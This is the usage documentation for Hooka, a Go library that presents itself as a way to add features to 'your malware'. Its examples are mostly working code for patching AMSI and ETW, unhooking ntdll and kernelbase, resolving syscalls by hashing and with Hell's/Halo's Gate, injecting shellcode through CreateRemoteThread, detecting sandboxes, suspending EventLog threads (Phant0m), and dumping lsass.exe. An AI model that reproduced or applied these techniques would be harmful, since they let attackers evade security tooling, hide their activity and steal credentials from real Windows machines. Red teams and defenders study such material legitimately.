# Library

If you're looking to implement any function in your malware you can do it using the official package API. First of all you have to download the package

```sh
go get github.com/D3Ext/Hooka/pkg/hooka
```

Here you have some real examples

> Detect hooked functions (including false positives)
```go
package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Returns all hooked functions
  hooks, err := hooka.DetectHooks() // func DetectHooks() ([]string, error)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hooks)

  // Check if an especific function is hooked
  check, err := hooka.IsHooked("NtCreateThread") // func IsHooked(funcname string) (bool, error)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(check) // true or false
}
```

> Resolve syscalls via API hashing
```go
package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){

  // 8c2beefa1c516d318252c9b1b45253e0549bb1c4 = Sha1(NtCreateThread)

  // func GetFuncPtr(hash string, dll string, hashing_function func(str string) string) (*windows.LazyProc, string, error)
  NtCreateThread, _, err := hooka.GetFuncPtr("8c2beefa1c516d318252c9b1b45253e0549bb1c4", "C:\\Windows\\System32\\ntdll.dll", Sha1)
  if err != nil {
    log.Fatal(err)
  }

  // Now use the procedure as usually
  NtCreateThread.Call(...)
}
```

> Patch AMSI and ETW
```go
package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Amsi bypass
  err := hooka.PatchAmsi()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("AMSI bypassed!")

  // ETW bypass
  err = hooka.PatchEtw()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("ETW bypassed!")
}
```

> Get syscall id with Hell's Gate + Halo's Gate
```go
package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Get syscall id of function, only ntdll.dll is supported
  sysId, err := hooka.GetSysId("NtCreateThread") // func GetSysId(funcname string) (uint16, error)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Syscall ID:", sysId)
  r, err := hooka.Syscall( // Execute syscall
    sysId,  // especify func
    arg1,   // pass neccesary arguments
    arg2,
    arg3,
    arg4,
  )

  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Error code:", r)
}
```

> Get syscall id using hashing
```go
package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  //func GetSysIdHash(hash string, dll string, hashing_func func(str string) string) (uint16, string, error)
  NtCreateThread, err := hooka.GetSysIdHash("8c2beefa1c516d318252c9b1b45253e0549bb1c4", "C:\\Windows\\System32\\ntdll.dll", Sha1)
  if err != nil {
    log.Fatal(err)
  }

  r, err := hooka.Syscall(NtCreateThread, ...)
  if err != nil {
    log.Fatal(err)
  }
}
```

> Get syscall id using hashing combined with Hell's Gate + Halo's Gate
```go
package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  //func GetSysIdHashHalos(hash string, dll string, hashing_func func(str string) string) (uint16, string, error)
  NtCreateThread, err := hooka.GetSysIdHashHalos("8c2beefa1c516d318252c9b1b45253e0549bb1c4", "C:\\Windows\\System32\\ntdll.dll", Sha1)
  if err != nil {
    log.Fatal(err)
  }

  r, err := hooka.Syscall(NtCreateThread, ...)
  if err != nil {
    log.Fatal(err)
  }
}
```

> Use shellcode injection techniques
```go
package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

var calc_shellcode = []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x1, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3}

func main(){
  // func CreateRemoteThread(shellcode []byte, pid int) error
  // specify the shellcode and the PID to inject the shellcode in. Use 0 as PID to inject in current process
  err := hooka.CreateRemoteThread(calc_shellcode, 0)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Shellcode injected via CreateRemoteThread")
}
```

> Unhook a function (3 ways)
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // this function unhooks given functions of especified dll using classic unhooking technique
  // func ClassicUnhook(funcnames []string, dllpath string) error
  err := hooka.ClassicUnhook([]string{"NtCreateThreadEx", "NtOpenProcess"}, "C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    log.Fatal(err)
  }

  // unhook all functions from every dll of a slice
  err = hooka.FullUnhook([]string{"C:\\Windows\\System32\\ntdll.dll", "C:\\Windows\\System32\\kernelbase.dll"})
  if err != nil {
    log.Fatal(err)
  }

  // get a clean copy of every DLL from a suspended process (e.g. notepad.exe) and copy the clean DLL to th the current process
  err = hooka.PerunsUnhook([]string{"C:\\Windows\\System32\\ntdll.dll", "C:\\Windows\\System32\\kernelbase.dll"})
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[+] Functions should have been unhooked!")
}
```

> Enable ACG on current process
```go
package main

import (
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  err := hooka.EnableACG()
  if err != nil {
    log.Fatal(err)
  }
}
```

> Block non-Microsoft signed DLLs on current process (BlockDLLs)
```go
package main

import (
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  err := hooka.BlockDLLs()
  if err != nil {
    log.Fatal(err)
  }
}
```

> Create process with BlockDLLs enabled
```go
package main

import (
  "log"
  "fmt"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // launch a program (e.g. notepad.exe) with BlockDLLs enabled
  err := hooka.CreateProcessBlockDLLs("C:\\Windows\\System32\\notepad.exe")
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Process launched!")
}
```

> Detect sandbox using multiple techniques (see `evasion/sandbox` for specific functions)
```go
package main

import (
  "log"
  "fmt"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  check, err := hooka.AutoCheck()
  if err != nil {
    log.Fatal(err)
  }

  if check {
    fmt.Println("Sandbox detected!")
    os.Exit(0)
  }

  fmt.Println("Probably not a sandbox")
}
```

> Suspend EventLog threads (Phant0m technique)
```go
package main

import (
  "log"
  "fmt"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  pid, err := hooka.GetEventLogPid()
  if err != nil {
    log.Fatal(err)
  }

  err = hooka.Phant0m(pid)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Success!")
}
```

> Dump lsass.exe to a file
```go
package main

import (
  "log"
  "fmt"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  err := hooka.DumpLsass("dump_file")
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("lsass.exe dumped to a file")
}
```




